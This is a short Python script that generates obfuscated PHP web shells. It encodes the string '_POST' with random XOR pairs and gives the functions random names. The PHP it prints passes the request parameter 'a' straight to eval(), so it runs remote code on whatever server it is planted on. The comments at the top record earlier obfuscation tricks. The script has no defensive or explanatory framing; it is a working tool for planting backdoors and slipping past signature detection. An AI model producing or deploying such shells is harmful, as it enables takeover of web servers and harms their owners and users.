import random
#$_1='_'.(hex2bin("10")^"@").(hex2bin("0F")^"@").(hex2bin("13")^"@").(hex2bin("14")^"@");
#$_1='_'.chr(94^14).chr(46^97);
#POST

#%50%4f%53%54
#P^{1}

#80  79  83  84



shell='''<?php
function {1}(){{
	$_1={0};
	return $_1;
}}

function {2}($user)
{{
	$_x=null;
	eval("\\n".$user.$_x);
}}
$_2=${{{1}()}}[a];
$_3=null;
$_4=$_3.$_2;
{2}($_4);
?>'''



list=[80,79,83,84]

def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    return ''.join(random.sample(str,len))   
    
def get_num():
    post_str = "'_'"
    for i in list:
        a=random.randint(1,100)
        b=a^i
        post_str=post_str+".chr({0}^{1})".format(a,b)
        #print(".chr({0}^{1})".format(a,b))
    #print(post_str)
    return post_str

def main():
    post_str = get_num()
    FunctionName1 = random_name(4)
    FunctionName2 = random_name(4)
    parameter1 = random_name(4)
    parameter2 = random_name(4)
    shellc = shell.format(post_str,FunctionName1,FunctionName2)
    print(shellc)
   
   
main()
